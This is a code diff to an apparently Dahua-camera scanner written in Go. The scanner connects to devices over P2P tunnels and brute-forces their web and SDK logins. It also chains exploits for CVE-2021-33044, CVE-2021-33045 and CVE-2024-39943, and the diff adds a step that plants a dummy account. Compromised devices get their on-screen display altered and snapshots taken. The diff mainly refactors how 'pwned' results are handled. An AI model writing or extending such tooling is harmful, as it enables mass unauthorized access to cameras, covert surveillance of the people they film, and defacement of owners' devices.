@@ -199,8 +199,8 @@ func (s *Scanner) Run() {
 							if val, err := getIntValue(s.Config.Brute.Type1.Delay); err == nil && val > 0 {
 								type1Delay = val
 							}
-							for _, cred := range s.Config.Brute.Credentials {
-								if type1Delay > 0 {
+							for idx, cred := range s.Config.Brute.Credentials {
+								if type1Delay > 0 && idx > 0 {
 									time.Sleep(time.Duration(type1Delay) * time.Second)
 								}
 								authClient := p2p.NewDHClient(serial)
@@ -329,8 +329,34 @@ func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
 	s.mu.Unlock()
 }
 
+func (s *Scanner) handlePwnedResult(serial, ip string, res *ExploitResult, tunnel *p2p.PTCPTunnel, reopen func(*ExploitResult) (*p2p.PTCPTunnel, bool)) {
+	activeTunnel, fresh := reopen(res)
+	if fresh {
+		go activeTunnel.Disconnect()
+	}
+	res.IP = ip
+	s.handlePwned(serial, res)
+	s.applyOSD(serial, tunnel, res)
+	if !s.launchSnapshot(serial, res) {
+		s.mu.Lock()
+		s.CompletedCount++
+		s.mu.Unlock()
+	}
+}
+
+// report whether the method pwned the device
+func stagePwned(stage string, res *ExploitResult, err error) bool {
+	if err != nil || res == nil {
+		return false
+	}
+	if stage == "33044" || stage == "33045" {
+		return res.Password != ""
+	}
+	return true
+}
+
 func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2p.PTCPTunnel, directOK bool) {
-	reopenVerifiedTunnel := func(res *ExploitResult) (*p2p.PTCPTunnel, bool) {
+	reopenTunnelFor := func(res *ExploitResult) (*p2p.PTCPTunnel, bool) {
 		if res == nil || (res.Method != "cve-2021-33044" && res.Method != "cve-2021-33045") || res.Login == "" || res.Password == "" {
 			return tunnel, false
 		}
@@ -412,56 +438,38 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	}
 
 	// CVE exploits
+	finishStage := func(stage string, res *ExploitResult, err error) bool {
+		if stagePwned(stage, res, err) {
+			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor)
+			return false
+		}
+		return true
+	}
+
 	if s.Config.Pwn.Protocol["cgi"] {
 		if s.Config.Pwn.Methods["cve-2021-33044"] {
 			res, err := TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
-			if err == nil && res != nil && res.Password != "" {
-				activeTunnel, fresh := reopenVerifiedTunnel(res)
-				if fresh {
-					go activeTunnel.Disconnect()
-				}
-				res.IP = ip
-				s.handlePwned(serial, res)
-				s.applyOSD(serial, tunnel, res)
-				if !s.launchSnapshot(serial, res) {
-					s.mu.Lock()
-					s.CompletedCount++
-					s.mu.Unlock()
-				}
+			if !finishStage("33044", res, err) {
 				return
 			}
 		}
 
 		if s.Config.Pwn.Methods["cve-2021-33045"] {
 			res, err := TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
-			if err == nil && res != nil && res.Password != "" {
-				activeTunnel, fresh := reopenVerifiedTunnel(res)
-				if fresh {
-					go activeTunnel.Disconnect()
-				}
-				res.IP = ip
-				s.handlePwned(serial, res)
-				s.applyOSD(serial, tunnel, res)
-				if !s.launchSnapshot(serial, res) {
-					s.mu.Lock()
-					s.CompletedCount++
-					s.mu.Unlock()
-				}
+			if !finishStage("33045", res, err) {
 				return
 			}
 		}
 
 		if s.Config.Pwn.Methods["cve-2024-39943"] {
 			res, err := TryCVE2024_39943(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password)
-			if err == nil && res != nil {
-				res.IP = ip
-				s.handlePwned(serial, res)
-				s.applyOSD(serial, tunnel, res)
-				if !s.launchSnapshot(serial, res) {
-					s.mu.Lock()
-					s.CompletedCount++
-					s.mu.Unlock()
-				}
+			if !finishStage("39943", res, err) {
+				return
+			}
+		}
+
+		if s.Config.Pwn.Methods["cve-2021-33045"] {
+			if addRes, addErr := TryAddDummy33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password); !finishStage("33045-add", addRes, addErr) {
 				return
 			}
 		}
@@ -469,14 +477,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		if s.Config.Pwn.Methods["brute"] {
 			res, err := TryBruteForceWeb(tunnel, s.Config.Brute.Credentials)
 			if err == nil && res != nil {
-				res.IP = ip
-				s.handlePwned(serial, res)
-				s.applyOSD(serial, tunnel, res)
-				if !s.launchSnapshot(serial, res) {
-					s.mu.Lock()
-					s.CompletedCount++
-					s.mu.Unlock()
-				}
+				s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor)
 				return
 			}
 		}
@@ -491,14 +492,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 	if runSDK {
 		res, err := TryBruteForceSDK(tunnel, s.Config.Brute.Credentials)
 		if err == nil && res != nil {
-			res.IP = ip
-			s.handlePwned(serial, res)
-			s.applyOSD(serial, tunnel, res)
-			if !s.launchSnapshot(serial, res) {
-				s.mu.Lock()
-				s.CompletedCount++
-				s.mu.Unlock()
-			}
+			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor)
 			return
 		}
 	}
